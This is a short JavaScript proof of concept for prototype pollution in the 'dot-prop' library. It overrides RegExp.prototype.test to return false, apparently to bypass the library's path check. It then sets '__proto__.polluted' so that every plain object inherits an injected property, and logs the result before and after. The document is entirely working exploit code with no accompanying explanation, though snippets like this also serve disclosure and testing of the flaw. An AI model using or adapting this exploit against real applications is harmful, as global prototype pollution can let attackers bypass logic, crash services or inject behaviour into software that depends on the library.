RegExp.prototype.test = () => false;
console.log({}.polluted);
const dotProp = require('dot-prop');
dotProp.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);